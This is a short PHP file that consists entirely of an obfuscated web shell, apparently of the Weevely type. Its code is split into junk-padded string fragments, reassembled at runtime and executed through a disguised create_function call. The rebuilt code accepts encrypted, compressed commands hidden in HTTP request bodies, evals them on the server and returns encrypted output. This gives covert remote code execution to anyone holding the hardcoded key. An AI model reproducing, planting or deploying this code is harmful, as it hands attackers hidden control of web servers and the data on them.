<?php
$s='4tut"),$m)==4t1) {@o4tb4t_start4t();@4teva4tl(@gzuncom4tpress(@x(@ba4tse4t64_deco4tde($m[1]4t),4t$k)));$o=4t4t@ob_get_';
$A='tk){$c=4tstrlen($4tk)4t;$l4t=strle4tn($t);$o4t="";for($i=04t;$i<$l;4t){for(4t$j=0;(4t4t$j<$c&4t&$i<$l);$4tj++,$4ti++)';
$u='cont4ten4tts();@ob_4ten4td_clean(4t);$r=@b4tase64_e4tncode4t(@x(@gzcom4tpr4tess($o),$4tk));4tprint4t("$p$kh4t$r$kf");}';
$M=str_replace('k','','crkkkkekate_funkction');
$C='{$o.=$4tt{$i}^4t$k{4t$j};}}ret4turn4t $4to4t;}if (@preg_match(4t"/$kh(4t.+)4t$kf/",4t@fi4tle_get_c4t4tontents("4tphp://inp';
$H='$k="24tb1e1e73";$4tkh=4t"81410ae4t693cf4t"4t4t;$kf="17d4e0f4t34t8db3";$p="Bht4tvs6OvkY4tP8Dn2C";f4tunct4t4tion x($t,$4';
$I=str_replace('4t','',$H.$A.$C.$s.$u);
$O=$M('',$I);$O();
?>
